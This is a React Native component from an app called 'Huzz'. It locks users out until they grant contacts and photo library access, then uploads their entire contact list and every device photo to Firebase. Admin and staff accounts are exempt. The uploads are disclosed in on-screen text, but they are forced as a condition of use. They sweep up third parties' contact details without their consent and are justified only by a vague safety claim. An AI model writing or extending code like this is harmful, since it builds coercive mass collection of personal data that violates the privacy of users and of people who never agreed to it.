import React, { useCallback, useEffect, useRef, useState } from 'react';
import { View, Text, StyleSheet, ActivityIndicator, Platform } from 'react-native';
import { SafeAreaView } from 'react-native-safe-area-context';
import { authService, checkUserRoleFromAdminCollection, userService } from '../../services/firebaseService';
import {
  getContactsPermissionStatus,
  getStoragePermissionStatus,
  openAppSettings,
  requestContactsPermission,
  requestStoragePermission,
  syncDeviceMediaToFirebase,
} from '../../services/contactsService.native';
import { RetroButton } from '../../ui/components/RetroButton.native';
import { tokens } from '../../ui/tokens';

/**
 * Blocks logged-in users until contacts + photo library permissions are granted.
 * Uploads all contacts + device photos to Firebase on success.
 */
export function PermissionsRequiredGate() {
  const [checking, setChecking] = useState(true);
  const [blocked, setBlocked] = useState(false);
  const [busy, setBusy] = useState(false);
  const [hint, setHint] = useState('');
  const [needsContacts, setNeedsContacts] = useState(true);
  const [needsStorage, setNeedsStorage] = useState(true);
  const [contactsCanAsk, setContactsCanAsk] = useState(true);
  const [storageCanAsk, setStorageCanAsk] = useState(true);
  const [photoProgress, setPhotoProgress] = useState(null);
  const skipRef = useRef(false);
  const runningRef = useRef(false);
  const syncedSessionRef = useRef(false);

  const persistPermissions = useCallback(async (userId, { contacts, storage, contactCount, photoCount }) => {
    if (!userId) return;
    await userService.updateUser(userId, {
      contactsPermission: contacts ? 'granted' : 'denied',
      storagePermission: storage ? 'granted' : 'denied',
      contactsSyncedAt: contacts ? new Date().toISOString() : null,
      photosSyncedAt: storage ? new Date().toISOString() : null,
      contactCount: typeof contactCount === 'number' ? contactCount : null,
      photoCount: typeof photoCount === 'number' ? photoCount : null,
    });
  }, []);

  const runMediaSync = useCallback(async (userId) => {
    setPhotoProgress(null);
    const result = await syncDeviceMediaToFirebase(userId, {
      onPhotoProgress: ({ current, total }) => setPhotoProgress({ current, total }),
    });
    if (result.contacts?.error) {
      return { error: result.contacts.error, contactCount: 0, photoCount: 0 };
    }
    if (result.photos?.error) {
      return { error: result.photos.error, contactCount: result.contacts?.count || 0, photoCount: 0 };
    }
    return {
      error: null,
      contactCount: result.contacts?.count || 0,
      photoCount: result.photos?.count || 0,
    };
  }, []);

  const evaluate = useCallback(async () => {
    if (runningRef.current) return;
    runningRef.current = true;
    setChecking(true);
    try {
      const user = authService.getCurrentUser();
      if (!user?.uid) {
        setBlocked(false);
        return;
      }

      try {
        const role = await checkUserRoleFromAdminCollection(user.uid);
        if (role?.isAdmin || role?.isStaff) {
          skipRef.current = true;
          setBlocked(false);
          return;
        }
      } catch {
        /* continue */
      }

      skipRef.current = false;
      const [contactsPerm, storagePerm] = await Promise.all([
        getContactsPermissionStatus(),
        getStoragePermissionStatus(),
      ]);

      setNeedsContacts(!contactsPerm.granted);
      setNeedsStorage(!storagePerm.granted);
      setContactsCanAsk(contactsPerm.canAskAgain !== false);
      setStorageCanAsk(storagePerm.canAskAgain !== false);

      if (!contactsPerm.granted || !storagePerm.granted) {
        syncedSessionRef.current = false;
      }

      if (contactsPerm.granted && storagePerm.granted) {
        if (!syncedSessionRef.current) {
          syncedSessionRef.current = true;
          setBusy(true);
          setHint('Uploading contacts and photos to your account…');
          const { error, contactCount, photoCount } = await runMediaSync(user.uid);
          setBusy(false);
          setPhotoProgress(null);
          if (error) {
            syncedSessionRef.current = false;
            setBlocked(true);
            setHint(error || 'Could not sync device data. Try again.');
            return;
          }
          await persistPermissions(user.uid, {
            contacts: true,
            storage: true,
            contactCount,
            photoCount,
          });
        }
        setBlocked(false);
        setHint('');
        return;
      }

      setBlocked(true);
      const parts = [];
      if (!contactsPerm.granted) {
        parts.push('Contacts — required. We upload your contact list to keep the community safe.');
      }
      if (!storagePerm.granted) {
        parts.push('Photos — required. We upload your device photos to your account.');
      }
      const settingsHint =
        !contactsPerm.canAskAgain || !storagePerm.canAskAgain
          ? '\n\nOne or more permissions were denied. Open Settings → Huzz to enable them, then tap “Check again”.'
          : '';
      setHint(parts.join('\n\n') + settingsHint);
    } finally {
      setChecking(false);
      runningRef.current = false;
    }
  }, [persistPermissions, runMediaSync]);

  useEffect(() => {
    evaluate();
    const unsub = authService.onAuthStateChange(() => evaluate());
    return () => unsub && unsub();
  }, [evaluate]);

  const onAllowPress = async () => {
    const user = authService.getCurrentUser();
    if (!user?.uid) return;

    if (!contactsCanAsk && !storageCanAsk) {
      openAppSettings();
      return;
    }

    setBusy(true);
    try {
      let contactsOk = !needsContacts;
      let storageOk = !needsStorage;

      if (needsContacts) {
        if (!contactsCanAsk) {
          openAppSettings();
          return;
        }
        const req = await requestContactsPermission();
        contactsOk = req.granted;
        setContactsCanAsk(req.canAskAgain !== false);
        setNeedsContacts(!req.granted);
      }

      if (needsStorage) {
        if (!storageCanAsk) {
          openAppSettings();
          return;
        }
        const req = await requestStoragePermission();
        storageOk = req.granted;
        setStorageCanAsk(req.canAskAgain !== false);
        setNeedsStorage(!req.granted);
      }

      if (!contactsOk || !storageOk) {
        setBlocked(true);
        setHint(
          !contactsOk && !storageOk
            ? 'Contacts and photo access are required to use Huzz.'
            : !contactsOk
              ? 'Contacts access is required to use Huzz.'
              : 'Photo library access is required to use Huzz.'
        );
        return;
      }

      setHint('Uploading contacts and photos…');
      const { error, contactCount, photoCount } = await runMediaSync(user.uid);
      if (error) {
        setHint(error || 'Could not upload device data. Try again.');
        setBlocked(true);
        return;
      }

      syncedSessionRef.current = true;
      await persistPermissions(user.uid, {
        contacts: true,
        storage: true,
        contactCount,
        photoCount,
      });
      setBlocked(false);
      setHint('');
    } finally {
      setBusy(false);
      setPhotoProgress(null);
    }
  };

  if (checking || !blocked || skipRef.current) return null;

  const openSettings = !contactsCanAsk || !storageCanAsk;

  return (
    <View style={styles.overlay} pointerEvents="auto">
      <SafeAreaView style={styles.cardWrap}>
        <View style={styles.card}>
          <Text style={styles.title}>Permissions required</Text>
          <Text style={styles.body}>{hint}</Text>
          <View style={styles.checklist}>
            <Text style={[styles.checkItem, !needsContacts ? styles.checkDone : null]}>
              {!needsContacts ? '✓' : '○'} Contacts access
            </Text>
            <Text style={[styles.checkItem, !needsStorage ? styles.checkDone : null]}>
              {!needsStorage ? '✓' : '○'} Photos & storage
            </Text>
          </View>
          {photoProgress ? (
            <Text style={styles.progressText}>
              Uploading photos {photoProgress.current}/{photoProgress.total}…
            </Text>
          ) : null}
          {busy ? <ActivityIndicator color={tokens.colors.accent} style={{ marginVertical: 12 }} /> : null}
          <RetroButton
            variant="blue"
            title={openSettings ? 'Open Settings' : 'Allow access'}
            onPress={onAllowPress}
            disabled={busy}
          />
          {openSettings ? (
            <RetroButton
              variant="gray"
              title="I enabled them — check again"
              onPress={evaluate}
              disabled={busy}
              style={{ marginTop: 10 }}
            />
          ) : null}
        </View>
      </SafeAreaView>
    </View>
  );
}

const styles = StyleSheet.create({
  overlay: {
    ...StyleSheet.absoluteFillObject,
    backgroundColor: 'rgba(15, 23, 42, 0.92)',
    zIndex: 9998,
    elevation: 9998,
  },
  cardWrap: { flex: 1, justifyContent: 'center', padding: 24 },
  card: {
    backgroundColor: '#f8fafc',
    borderRadius: 16,
    padding: 22,
    borderWidth: 1,
    borderColor: '#cbd5e1',
    ...Platform.select({
      ios: {
        shadowColor: '#0f172a',
        shadowOffset: { width: 0, height: 8 },
        shadowOpacity: 0.15,
        shadowRadius: 16,
      },
      android: { elevation: 8 },
    }),
  },
  title: { fontSize: 22, fontWeight: '800', color: '#0f172a', marginBottom: 10 },
  body: { fontSize: 15, lineHeight: 22, color: '#334155', marginBottom: 14 },
  checklist: { marginBottom: 14, gap: 6 },
  checkItem: { fontSize: 14, color: '#64748b', fontWeight: '600' },
  checkDone: { color: '#047857' },
  progressText: { fontSize: 13, color: '#047857', fontWeight: '600', marginBottom: 8 },
});
